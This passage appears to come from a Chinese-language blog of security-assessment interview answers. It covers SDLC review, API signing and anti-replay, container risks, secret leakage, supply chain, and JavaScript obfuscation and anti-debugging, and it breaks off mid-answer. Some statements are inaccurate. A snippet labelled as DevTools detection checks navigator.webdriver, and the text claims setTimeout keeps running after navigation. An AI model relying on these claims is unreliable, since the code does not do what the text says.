<strong>业务逻辑漏洞</strong>：<br>   - 评估支付、交易等关键功能，防止恶意利用。</h2><h4 id="需求阶段、各分阶段安全评估的侧重点是什么？"><a href="#需求阶段、各分阶段安全评估的侧重点是什么？" class="headerlink" title="需求阶段、各分阶段安全评估的侧重点是什么？"></a><strong>需求阶段、各分阶段安全评估的侧重点是什么？</strong></h4><p><strong>不同阶段的安全评估重点</strong>：</p>
<ol>
<li><p><strong>需求阶段</strong>：</p>
<ul>
<li>识别业务逻辑中的潜在安全风险，如支付流程、权限管理等。</li>
<li>确保合规性（GDPR、PCI DSS 等）。</li>
</ul>
</li>
<li><p><strong>设计阶段</strong>：</p>
<ul>
<li>采用 <strong>最小权限原则</strong> 设计访问控制。</li>
<li>评估加密方案，防止数据泄露。</li>
</ul>
</li>
<li><p><strong>开发阶段</strong>：</p>
<ul>
<li>代码审计（SAST），检查 XSS、SQL 注入等漏洞。</li>
<li>代码安全规范（禁止硬编码密钥等）。</li>
</ul>
</li>
<li><p><strong>测试阶段</strong>：</p>
<ul>
<li>进行黑盒测试（DAST），模拟攻击者视角查找漏洞。</li>
</ul>
</li>
<li><p><strong>上线后</strong>：</p>
<ul>
<li>启用 <strong>入侵检测系统（IDS）</strong>，监控异常行为。</li>
<li>定期漏洞扫描，防止安全回归。</li>
</ul>
</li>
</ol>
<hr>
<h4 id="接口-B-的参数是从接口-A-的响应中获取的，会存在哪些风险？"><a href="#接口-B-的参数是从接口-A-的响应中获取的，会存在哪些风险？" class="headerlink" title="接口 B 的参数是从接口 A 的响应中获取的，会存在哪些风险？"></a><strong>接口 B 的参数是从接口 A 的响应中获取的，会存在哪些风险？</strong></h4><p><strong>常见风险</strong>：</p>
<ul>
<li><strong>信任链问题</strong>：接口 A 的数据未经校验直接传递给接口 B，导致漏洞传播。</li>
<li><strong>数据篡改</strong>：如果攻击者能劫持接口 A 响应，可伪造数据影响接口 B。</li>
<li><strong>请求伪造</strong>：如果接口 A 返回可被滥用的 URL，攻击者可构造恶意请求。</li>
</ul>
<h2 id="防范措施：-数据完整性校验：接口-A-的响应必须进行签名验证。-限制数据来源：接口-B-仅接受可信-API-的数据。-使用-Token-关联请求，防止数据篡改。"><a href="#防范措施：-数据完整性校验：接口-A-的响应必须进行签名验证。-限制数据来源：接口-B-仅接受可信-API-的数据。-使用-Token-关联请求，防止数据篡改。" class="headerlink" title="防范措施：- 数据完整性校验：接口 A 的响应必须进行签名验证。- 限制数据来源：接口 B 仅接受可信 API 的数据。- 使用 Token 关联请求，防止数据篡改。"></a><strong>防范措施</strong>：<br>- <strong>数据完整性校验</strong>：接口 A 的响应必须进行签名验证。<br>- <strong>限制数据来源</strong>：接口 B 仅接受可信 API 的数据。<br>- <strong>使用 Token 关联请求</strong>，防止数据篡改。</h2><h4 id="新的-API-接口上线时，如何设计使其避免出现请求篡改和请求重放？"><a href="#新的-API-接口上线时，如何设计使其避免出现请求篡改和请求重放？" class="headerlink" title="新的 API 接口上线时，如何设计使其避免出现请求篡改和请求重放？"></a><strong>新的 API 接口上线时，如何设计使其避免出现请求篡改和请求重放？</strong></h4><p><strong>防篡改措施</strong>：</p>
<ul>
<li><strong>参数签名</strong>：<ul>
<li>使用 <strong>HMAC-SHA256</strong> 计算请求参数签名：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac, hashlib</span><br><span class="line">secret = <span class="string">b&#x27;secret-key&#x27;</span></span><br><span class="line">message = <span class="string">b&#x27;param1=value1&amp;param2=value2&#x27;</span></span><br><span class="line">signature = hmac.new(secret, message, hashlib.sha256).hexdigest()</span><br></pre></td></tr></table></figure></li>
<li>服务器端校验签名，防止参数被篡改。</li>
</ul>
</li>
</ul>
<h2 id="防重放措施：-使用时间戳-随机数：-在请求中添加-timestamp-nonce，确保唯一性：-服务器端存储已使用的-nonce，防止重复请求。"><a href="#防重放措施：-使用时间戳-随机数：-在请求中添加-timestamp-nonce，确保唯一性：-服务器端存储已使用的-nonce，防止重复请求。" class="headerlink" title="防重放措施：- 使用时间戳+随机数：  - 在请求中添加 timestamp + nonce，确保唯一性：      - 服务器端存储已使用的 nonce，防止重复请求。"></a><strong>防重放措施</strong>：<br>- <strong>使用时间戳+随机数</strong>：<br>  - 在请求中添加 <code>timestamp</code> + <code>nonce</code>，确保唯一性：<br>    <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1700000000</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;nonce&quot;</span><span class="punctuation">:</span> <span class="string">&quot;random-uuid&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;signature&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hmac_signature&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br>  - 服务器端存储已使用的 <code>nonce</code>，防止重复请求。</h2><h4 id="Docker-容器以及-K8s-有哪些风险？"><a href="#Docker-容器以及-K8s-有哪些风险？" class="headerlink" title="Docker 容器以及 K8s 有哪些风险？"></a><strong>Docker 容器以及 K8s 有哪些风险？</strong></h4><p><strong>Docker 风险</strong>：</p>
<ul>
<li><strong>容器逃逸</strong>：攻击者可利用 <strong>CVE-2019-5736</strong> 等漏洞获取宿主机权限。</li>
<li><strong>不安全镜像</strong>：使用来源不明的镜像，可能带后门或恶意代码。</li>
<li><strong>权限提升</strong>：容器运行时使用 <code>--privileged</code> 选项，导致权限过高。</li>
</ul>
<p><strong>K8s 风险</strong>：</p>
<ul>
<li><strong>API 滥用</strong>：K8s API 未授权访问，导致敏感数据泄露。</li>
<li><strong>RBAC 配置错误</strong>：错误的角色绑定（如 <code>cluster-admin</code>）导致权限扩大。</li>
<li><strong>未隔离命名空间</strong>：多个应用共享命名空间，增加攻击面。</li>
</ul>
<h2 id="防范措施：-使用-最小权限原则-限制容器和-K8s-资源访问。-启用-Pod-Security-Policy，避免运行高权限容器。-定期扫描容器镜像，防止供应链攻击。"><a href="#防范措施：-使用-最小权限原则-限制容器和-K8s-资源访问。-启用-Pod-Security-Policy，避免运行高权限容器。-定期扫描容器镜像，防止供应链攻击。" class="headerlink" title="防范措施：- 使用 最小权限原则 限制容器和 K8s 资源访问。- 启用 Pod Security Policy，避免运行高权限容器。- 定期扫描容器镜像，防止供应链攻击。"></a><strong>防范措施</strong>：<br>- 使用 <strong>最小权限原则</strong> 限制容器和 K8s 资源访问。<br>- 启用 <strong>Pod Security Policy</strong>，避免运行高权限容器。<br>- 定期扫描容器镜像，防止供应链攻击。</h2><h4 id="IPv6-和-IPv4-安全差异？"><a href="#IPv6-和-IPv4-安全差异？" class="headerlink" title="IPv6 和 IPv4 安全差异？"></a><strong>IPv6 和 IPv4 安全差异？</strong></h4><p><strong>主要安全差异</strong>：</p>
<ol>
<li><strong>地址可用性</strong>：<ul>
<li>IPv6 地址空间更大，不再依赖 NAT 进行地址复用，但暴露面更大。</li>
</ul>
</li>
<li><strong>默认启用 ICMPv6</strong>：<ul>
<li>攻击者可利用 <strong>ICMPv6 邻居发现协议</strong> 发起 MITM 攻击。</li>
</ul>
</li>
<li><strong>无状态地址自动配置（SLAAC）</strong>：<ul>
<li>设备可自动分配 IPv6 地址，可能被恶意利用进行伪造。</li>
</ul>
</li>
</ol>
<h2 id="防范措施：-限制-IPv6-访问范围，使用防火墙规则拦截外部未授权流量。-启用-RA-Guard，防止恶意-IPv6-路由公告。"><a href="#防范措施：-限制-IPv6-访问范围，使用防火墙规则拦截外部未授权流量。-启用-RA-Guard，防止恶意-IPv6-路由公告。" class="headerlink" title="防范措施：- 限制 IPv6 访问范围，使用防火墙规则拦截外部未授权流量。- 启用 RA-Guard，防止恶意 IPv6 路由公告。"></a><strong>防范措施</strong>：<br>- <strong>限制 IPv6 访问范围</strong>，使用防火墙规则拦截外部未授权流量。<br>- <strong>启用 RA-Guard</strong>，防止恶意 IPv6 路由公告。</h2><h4 id="三方引入的应用和自研应用评估的差异有哪些？"><a href="#三方引入的应用和自研应用评估的差异有哪些？" class="headerlink" title="三方引入的应用和自研应用评估的差异有哪些？"></a><strong>三方引入的应用和自研应用评估的差异有哪些？</strong></h4><p><strong>三方应用评估</strong>：</p>
<ul>
<li>主要关注 <strong>供应链攻击</strong>，检查是否存在恶意代码或后门。</li>
<li>需要 <strong>代码审计</strong>，避免第三方 SDK 泄露数据。</li>
</ul>
<h2 id="自研应用评估：-重点关注-业务逻辑漏洞（如支付绕过、权限越权）。-代码安全规范需严格执行，防止内部泄露风险。"><a href="#自研应用评估：-重点关注-业务逻辑漏洞（如支付绕过、权限越权）。-代码安全规范需严格执行，防止内部泄露风险。" class="headerlink" title="自研应用评估：- 重点关注 业务逻辑漏洞（如支付绕过、权限越权）。- 代码安全规范需严格执行，防止内部泄露风险。"></a><strong>自研应用评估</strong>：<br>- 重点关注 <strong>业务逻辑漏洞</strong>（如支付绕过、权限越权）。<br>- 代码安全规范需严格执行，防止内部泄露风险。</h2><h4 id="金融业务有何特性？"><a href="#金融业务有何特性？" class="headerlink" title="金融业务有何特性？"></a><strong>金融业务有何特性？</strong></h4><ol>
<li><strong>高安全性</strong>：<ul>
<li>需符合 <strong>PCI DSS</strong>、GDPR 等合规要求。</li>
</ul>
</li>
<li><strong>强身份认证</strong>：<ul>
<li>使用 <strong>多因子认证（MFA）</strong>，防止账户被盗。</li>
</ul>
</li>
<li><strong>交易不可抵赖性</strong>：<ul>
<li>采用 <strong>数字签名</strong> 保障交易真实性。</li>
</ul>
</li>
</ol>
<hr>
<h4 id="mvn-源的安全性需要考虑哪些点？"><a href="#mvn-源的安全性需要考虑哪些点？" class="headerlink" title="mvn 源的安全性需要考虑哪些点？"></a><strong>mvn 源的安全性需要考虑哪些点？</strong></h4><ul>
<li><strong>防止供应链攻击</strong>：<ul>
<li>使用可信 Maven 仓库（如 Maven Central）。</li>
</ul>
</li>
<li><strong>依赖包完整性</strong>：<ul>
<li>启用 SHA256 校验：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">checksumPolicy</span>&gt;</span>fail<span class="tag">&lt;/<span class="name">checksumPolicy</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<hr>
<h4 id="如何让业务方主动找你评估？"><a href="#如何让业务方主动找你评估？" class="headerlink" title="如何让业务方主动找你评估？"></a><strong>如何让业务方主动找你评估？</strong></h4><ol>
<li><strong>建立安全反馈机制</strong>：<ul>
<li>设立安全邮箱，鼓励业务团队主动提交评估请求。</li>
</ul>
</li>
<li><strong>安全培训</strong>：<ul>
<li>提供 <strong>安全开发培训</strong>，提升业务团队的安全意识。</li>
</ul>
</li>
<li><strong>数据驱动决策</strong>：<ul>
<li>通过安全事件分析，展示安全风险对业务的影响，提高安全优先级。</li>
</ul>
</li>
</ol>
<h3 id="如何判断评估覆盖范围的优先级？"><a href="#如何判断评估覆盖范围的优先级？" class="headerlink" title="如何判断评估覆盖范围的优先级？"></a><strong>如何判断评估覆盖范围的优先级？</strong></h3><p><strong>优先级判断依据</strong>：</p>
<ol>
<li><strong>业务影响</strong>：<ul>
<li>关键业务（支付、身份认证、核心数据库）应优先评估。</li>
</ul>
</li>
<li><strong>攻击面大小</strong>：<ul>
<li>公开 API、Web 界面、第三方集成点风险较高，需优先测试。</li>
</ul>
</li>
<li><strong>历史安全事件</strong>：<ul>
<li>结合过往漏洞数据，优先排查高风险区域。</li>
</ul>
</li>
</ol>
<h2 id="最佳实践：-采用-攻击面分析（Attack-Surface-Analysis）-识别高风险区域。-结合-威胁建模-评估潜在威胁。"><a href="#最佳实践：-采用-攻击面分析（Attack-Surface-Analysis）-识别高风险区域。-结合-威胁建模-评估潜在威胁。" class="headerlink" title="最佳实践：- 采用 攻击面分析（Attack Surface Analysis） 识别高风险区域。- 结合 威胁建模 评估潜在威胁。"></a><strong>最佳实践</strong>：<br>- 采用 <strong>攻击面分析（Attack Surface Analysis）</strong> 识别高风险区域。<br>- 结合 <strong>威胁建模</strong> 评估潜在威胁。</h2><h3 id="如何系统提高安全评估效率？"><a href="#如何系统提高安全评估效率？" class="headerlink" title="如何系统提高安全评估效率？"></a><strong>如何系统提高安全评估效率？</strong></h3><p><strong>优化方法</strong>：</p>
<ol>
<li><strong>自动化测试</strong>：<ul>
<li>使用 SAST（静态代码分析）+ DAST（动态应用测试）提高漏洞发现速度。</li>
</ul>
</li>
<li><strong>CI&#x2F;CD 安全集成</strong>：<ul>
<li>在 DevOps 流程中嵌入安全测试，自动检测代码漏洞。</li>
</ul>
</li>
<li><strong>安全运营平台化</strong>：<ul>
<li>构建统一安全评估平台，集中管理资产、漏洞、测试结果。</li>
</ul>
</li>
</ol>
<h2 id="示例：-在-CI-CD-流程中集成-SonarQube-进行代码安全扫描。持续集成（CI）和持续部署（CD）流程-采用-Burp-Suite-自动化扫描-发现-Web-漏洞。"><a href="#示例：-在-CI-CD-流程中集成-SonarQube-进行代码安全扫描。持续集成（CI）和持续部署（CD）流程-采用-Burp-Suite-自动化扫描-发现-Web-漏洞。" class="headerlink" title="示例：- 在 CI&#x2F;CD 流程中集成 SonarQube 进行代码安全扫描。持续集成（CI）和持续部署（CD）流程- 采用 Burp Suite 自动化扫描 发现 Web 漏洞。"></a><strong>示例</strong>：<br>- 在 CI&#x2F;CD 流程中集成 <strong>SonarQube</strong> 进行代码安全扫描。持续集成（CI）和持续部署（CD）流程<br>- 采用 <strong>Burp Suite 自动化扫描</strong> 发现 Web 漏洞。</h2><h3 id="如何理解安全左移？"><a href="#如何理解安全左移？" class="headerlink" title="如何理解安全左移？"></a><strong>如何理解安全左移？</strong></h3><p><strong>概念</strong>：</p>
<ul>
<li><strong>安全左移（Shift Left Security）</strong> 指的是将安全评估前置到软件开发生命周期（SDLC）的早期阶段，而非仅在上线后检测漏洞。</li>
</ul>
<p><strong>关键实践</strong>：</p>
<ol>
<li><strong>在开发阶段进行代码安全审计</strong>（SAST）。</li>
<li><strong>CI&#x2F;CD 流程中集成安全扫描</strong>，避免上线后修复成本高。</li>
<li><strong>开发人员安全培训</strong>，提升安全意识。</li>
</ol>
<h2 id="示例：-在代码提交时运行-Checkmarx-进行静态代码分析。-在-Jenkins-Pipeline-中加入-OWASP-ZAP-自动化扫描。"><a href="#示例：-在代码提交时运行-Checkmarx-进行静态代码分析。-在-Jenkins-Pipeline-中加入-OWASP-ZAP-自动化扫描。" class="headerlink" title="示例：- 在代码提交时运行 Checkmarx 进行静态代码分析。- 在 Jenkins Pipeline 中加入 OWASP ZAP 自动化扫描。"></a><strong>示例</strong>：<br>- 在代码提交时运行 <strong>Checkmarx</strong> 进行静态代码分析。<br>- 在 Jenkins Pipeline 中加入 <strong>OWASP ZAP</strong> 自动化扫描。</h2><h3 id="安全评估的行业最佳实践是什么？"><a href="#安全评估的行业最佳实践是什么？" class="headerlink" title="安全评估的行业最佳实践是什么？"></a><strong>安全评估的行业最佳实践是什么？</strong></h3><ol>
<li><strong>威胁建模（Threat Modeling）</strong>：<ul>
<li>采用 STRIDE、DREAD 等方法预测攻击路径。</li>
</ul>
</li>
<li><strong>安全基线（Security Baseline）</strong>：<ul>
<li>参考 <strong>NIST、CIS、ISO 27001</strong> 建立安全标准。</li>
</ul>
</li>
<li><strong>零信任架构（Zero Trust Security）</strong>：<ul>
<li>任何访问请求都需经过严格身份验证和授权。</li>
</ul>
</li>
<li><strong>持续监测（Continuous Monitoring）</strong>：<ul>
<li>使用 <strong>SIEM（安全信息与事件管理）</strong> 实时检测异常行为。</li>
</ul>
</li>
</ol>
<p><strong>示例</strong>：</p>
<ul>
<li>企业安全框架参考 <strong>MITRE ATT&amp;CK</strong> 进行安全威胁建模。</li>
</ul>
<h3 id="硬编码密钥有何风险以及如何系统解决？"><a href="#硬编码密钥有何风险以及如何系统解决？" class="headerlink" title="硬编码密钥有何风险以及如何系统解决？"></a><strong>硬编码密钥有何风险以及如何系统解决？</strong></h3><p><strong>风险分析</strong>：</p>
<ol>
<li><p><strong>密钥暴露面大，攻击成本低</strong>：</p>
<ul>
<li>硬编码密钥易被泄露，<strong>GitHub、云盘、日志文件</strong> 都可能存储代码副本。</li>
<li>攻击者通过代码审计工具（如 TruffleHog、GitLeaks）扫描密钥。</li>
<li>泄露密钥后，攻击者可直接访问 API、数据库、云服务。</li>
</ul>
</li>
<li><p><strong>密钥难以更换</strong>：</p>
<ul>
<li>当密钥写死在代码中，变更成本大，需要重新部署应用。</li>
<li>攻击者可以长期利用泄露的密钥，造成持久性风险。</li>
</ul>
</li>
</ol>
<h2 id="解决方案：-使用环境变量存储密钥：-使用密钥管理系统（KMS）：-采用-AWS-KMS、HashiCorp-Vault-进行密钥管理，避免硬编码。-定期轮换密钥：-设定密钥-生命周期，定期生成新密钥，降低长期泄露风险。"><a href="#解决方案：-使用环境变量存储密钥：-使用密钥管理系统（KMS）：-采用-AWS-KMS、HashiCorp-Vault-进行密钥管理，避免硬编码。-定期轮换密钥：-设定密钥-生命周期，定期生成新密钥，降低长期泄露风险。" class="headerlink" title="解决方案：- 使用环境变量存储密钥：  - 使用密钥管理系统（KMS）：  - 采用 AWS KMS、HashiCorp Vault 进行密钥管理，避免硬编码。- 定期轮换密钥：  - 设定密钥 生命周期，定期生成新密钥，降低长期泄露风险。"></a><strong>解决方案</strong>：<br>- <strong>使用环境变量存储密钥</strong>：<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> API_KEY=<span class="string">&quot;your-secret-key&quot;</span></span><br></pre></td></tr></table></figure><br>- <strong>使用密钥管理系统（KMS）</strong>：<br>  - 采用 AWS KMS、HashiCorp Vault 进行密钥管理，避免硬编码。<br>- <strong>定期轮换密钥</strong>：<br>  - 设定密钥 <strong>生命周期</strong>，定期生成新密钥，降低长期泄露风险。</h2><h3 id="0day-漏洞如何防御？"><a href="#0day-漏洞如何防御？" class="headerlink" title="0day 漏洞如何防御？"></a><strong>0day 漏洞如何防御？</strong></h3><h2 id="防御策略：1-增强攻击面监控：-采用-威胁情报（Threat-Intelligence），订阅-CVE-预警信息。2-启用-RASP（运行时应用自我保护）：-通过-Hook-关键-API，检测异常行为，如-Java-RASP-监控-Runtime-exec-。3-加强访问控制：-限制高权限用户操作，如-SSH-访问、数据库管理权限。"><a href="#防御策略：1-增强攻击面监控：-采用-威胁情报（Threat-Intelligence），订阅-CVE-预警信息。2-启用-RASP（运行时应用自我保护）：-通过-Hook-关键-API，检测异常行为，如-Java-RASP-监控-Runtime-exec-。3-加强访问控制：-限制高权限用户操作，如-SSH-访问、数据库管理权限。" class="headerlink" title="防御策略：1. 增强攻击面监控：   - 采用 威胁情报（Threat Intelligence），订阅 CVE 预警信息。2. 启用 RASP（运行时应用自我保护）：   - 通过 Hook 关键 API，检测异常行为，如 Java RASP 监控 Runtime.exec()。3. 加强访问控制：   - 限制高权限用户操作，如 SSH 访问、数据库管理权限。"></a><strong>防御策略</strong>：<br>1. <strong>增强攻击面监控</strong>：<br>   - 采用 <strong>威胁情报（Threat Intelligence）</strong>，订阅 CVE 预警信息。<br>2. <strong>启用 RASP（运行时应用自我保护）</strong>：<br>   - 通过 <strong>Hook 关键 API</strong>，检测异常行为，如 Java RASP 监控 <code>Runtime.exec()</code>。<br>3. <strong>加强访问控制</strong>：<br>   - 限制高权限用户操作，如 SSH 访问、数据库管理权限。</h2><h4 id="GitHub-等三方泄漏敏感信息如何体系防御？"><a href="#GitHub-等三方泄漏敏感信息如何体系防御？" class="headerlink" title="GitHub 等三方泄漏敏感信息如何体系防御？"></a><strong>GitHub 等三方泄漏敏感信息如何体系防御？</strong></h4><h2 id="防御方法：1-自动化扫描：-使用-GitLeaks、TruffleHog-定期扫描-Git-仓库。2-强制-Git-Hook-检查：-在-Git-提交前检测敏感信息，防止误提交：-3-密钥失效机制：-一旦密钥泄露，立即使其失效并重新生成。"><a href="#防御方法：1-自动化扫描：-使用-GitLeaks、TruffleHog-定期扫描-Git-仓库。2-强制-Git-Hook-检查：-在-Git-提交前检测敏感信息，防止误提交：-3-密钥失效机制：-一旦密钥泄露，立即使其失效并重新生成。" class="headerlink" title="防御方法：1. 自动化扫描：   - 使用 GitLeaks、TruffleHog 定期扫描 Git 仓库。2. 强制 Git Hook 检查：   - 在 Git 提交前检测敏感信息，防止误提交：     3. 密钥失效机制：   - 一旦密钥泄露，立即使其失效并重新生成。"></a><strong>防御方法</strong>：<br>1. <strong>自动化扫描</strong>：<br>   - 使用 <strong>GitLeaks、TruffleHog</strong> 定期扫描 Git 仓库。<br>2. <strong>强制 Git Hook 检查</strong>：<br>   - 在 Git 提交前检测敏感信息，防止误提交：<br>     <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pre-commit run --all-files</span><br></pre></td></tr></table></figure><br>3. <strong>密钥失效机制</strong>：<br>   - 一旦密钥泄露，立即使其失效并重新生成。</h2><h3 id="业务逻辑漏洞如何通过技术手段挖掘与弥补？"><a href="#业务逻辑漏洞如何通过技术手段挖掘与弥补？" class="headerlink" title="业务逻辑漏洞如何通过技术手段挖掘与弥补？"></a><strong>业务逻辑漏洞如何通过技术手段挖掘与弥补？</strong></h3><p><strong>漏洞挖掘方法</strong>：</p>
<ol>
<li><strong>流量分析</strong>：<ul>
<li>通过 <strong>Burp Suite</strong> 捕获流量，分析参数可篡改性，如订单金额篡改。</li>
</ul>
</li>
<li><strong>Fuzzing（模糊测试）</strong>：<ul>
<li>对关键 API 进行输入变异测试，识别未处理的异常情况。</li>
</ul>
</li>
<li><strong>权限校验测试</strong>：<ul>
<li>使用低权限账户访问管理端 API，检查是否存在越权访问漏洞。</li>
</ul>
</li>
</ol>
<h2 id="修复策略：-后端强制权限校验，避免仅依赖前端限制。-启用幂等性检查，防止关键交易被重复执行。"><a href="#修复策略：-后端强制权限校验，避免仅依赖前端限制。-启用幂等性检查，防止关键交易被重复执行。" class="headerlink" title="修复策略：- 后端强制权限校验，避免仅依赖前端限制。- 启用幂等性检查，防止关键交易被重复执行。"></a><strong>修复策略</strong>：<br>- <strong>后端强制权限校验</strong>，避免仅依赖前端限制。<br>- <strong>启用幂等性检查</strong>，防止关键交易被重复执行。</h2><h3 id="软件供应链后门漏洞如何系统规避？"><a href="#软件供应链后门漏洞如何系统规避？" class="headerlink" title="软件供应链后门漏洞如何系统规避？"></a><strong>软件供应链后门漏洞如何系统规避？</strong></h3><p><strong>主要风险</strong>：</p>
<ul>
<li>供应链攻击可能通过 <strong>第三方库、开源组件</strong> 植入恶意代码，如 <strong>事件流（EventStream）后门</strong> 事件。</li>
</ul>
<p><strong>防范措施</strong>：</p>
<ol>
<li><strong>使用可信赖的软件仓库</strong>：<ul>
<li>采用 <strong>npm audit、pip check</strong> 等工具检测依赖漏洞。</li>
</ul>
</li>
<li><strong>启用 SCA（软件成分分析）</strong>：<ul>
<li>使用 <strong>Sonatype Nexus、Snyk</strong> 监测依赖安全性。</li>
</ul>
</li>
<li><strong>强制代码审计</strong>：<ul>
<li>采用 <strong>CodeQL</strong> 分析供应链代码，发现恶意代码片段。</li>
</ul>
</li>
</ol>
<h2 id="示例：使用-Snyk-扫描-Node-js-依赖："><a href="#示例：使用-Snyk-扫描-Node-js-依赖：" class="headerlink" title="示例：使用 Snyk 扫描 Node.js 依赖："></a><strong>示例：使用 Snyk 扫描 Node.js 依赖</strong>：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snyk <span class="built_in">test</span></span><br></pre></td></tr></table></figure></h2><h3 id="前端-JavaScript-代码如何混淆以及反调试？"><a href="#前端-JavaScript-代码如何混淆以及反调试？" class="headerlink" title="前端 JavaScript 代码如何混淆以及反调试？"></a><strong>前端 JavaScript 代码如何混淆以及反调试？</strong></h3><p><strong>混淆技术</strong>：</p>
<ol>
<li><strong>代码结构打乱</strong>：<ul>
<li>插入无用代码，使逻辑难以阅读和分析。</li>
</ul>
</li>
<li><strong>变量名修改</strong>：<ul>
<li>将变量名替换为随机字符串：<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="string">&quot;secret&quot;</span>; <span class="comment">// 原代码</span></span><br><span class="line"><span class="keyword">var</span> _0x1a3b4 = <span class="string">&quot;secret&quot;</span>; <span class="comment">// 混淆后</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>字符串加密</strong>：<ul>
<li>使用 <strong>RC4</strong> 或 <strong>Base64</strong> 编码保护字符串：<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="title function_">atob</span>(<span class="string">&quot;c2VjcmV0&quot;</span>); <span class="comment">// &quot;secret&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>Unicode 转换</strong>：<ul>
<li>代码转换为 Unicode 表示：<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;\u0068\u0065\u006c\u006c\u006f&quot;</span>; <span class="comment">// &quot;hello&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="反调试技术：1-禁用开发者工具：-监听-DevTools-打开状态，触发-debugger：-2-拦截-console-调试：-禁用-console-：-3-代码自毁机制：-当代码检测到-DevTools-运行时，修改关键变量或终止执行："><a href="#反调试技术：1-禁用开发者工具：-监听-DevTools-打开状态，触发-debugger：-2-拦截-console-调试：-禁用-console-：-3-代码自毁机制：-当代码检测到-DevTools-运行时，修改关键变量或终止执行：" class="headerlink" title="反调试技术：1. 禁用开发者工具：   - 监听 DevTools 打开状态，触发 debugger：     2. 拦截 console 调试：   - 禁用 console.*：     3. 代码自毁机制：   - 当代码检测到 DevTools 运行时，修改关键变量或终止执行：     "></a><strong>反调试技术</strong>：<br>1. <strong>禁用开发者工具</strong>：<br>   - 监听 <code>DevTools</code> 打开状态，触发 <code>debugger</code>：<br>     <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Checking DevTools...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">outerHeight</span> - <span class="variable language_">window</span>.<span class="property">innerHeight</span> &gt; <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">reload</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><br>2. <strong>拦截 <code>console</code> 调试</strong>：<br>   - 禁用 <code>console.*</code>：<br>     <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="property">log</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;;</span><br></pre></td></tr></table></figure><br>3. <strong>代码自毁机制</strong>：<br>   - 当代码检测到 <code>DevTools</code> 运行时，修改关键变量或终止执行：<br>     <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">navigator</span>.<span class="property">webdriver</span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;Debugger detected!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></h2><h3 id="如何实现当前页面-location-href-改变后，仍然能执行之前的-JavaScript？"><a href="#如何实现当前页面-location-href-改变后，仍然能执行之前的-JavaScript？" class="headerlink" title="如何实现当前页面 location.href 改变后，仍然能执行之前的 JavaScript？"></a><strong>如何实现当前页面 <code>location.href</code> 改变后，仍然能执行之前的 JavaScript？</strong></h3><h2 id="方法：1-使用-setTimeout-执行延迟任务：-JavaScript-的-setTimeout-方法不会被-location-href-影响，可用于延迟执行代码：-2-使用-window-onbeforeunload-监听跳转：-在页面跳转前执行代码：-3-Service-Worker-方式：-通过-Service-Worker-持续运行-JS-逻辑，即使页面跳转："><a href="#方法：1-使用-setTimeout-执行延迟任务：-JavaScript-的-setTimeout-方法不会被-location-href-影响，可用于延迟执行代码：-2-使用-window-onbeforeunload-监听跳转：-在页面跳转前执行代码：-3-Service-Worker-方式：-通过-Service-Worker-持续运行-JS-逻辑，即使页面跳转：" class="headerlink" title="方法：1. 使用 setTimeout 执行延迟任务：   - JavaScript 的 setTimeout 方法不会被 location.href 影响，可用于延迟执行代码：     2. 使用 window.onbeforeunload 监听跳转：   - 在页面跳转前执行代码：     3. Service Worker 方式：   - 通过 Service Worker 持续运行 JS 逻辑，即使页面跳转：     "></a><strong>方法</strong>：<br>1. <strong>使用 <code>setTimeout</code> 执行延迟任务</strong>：<br> 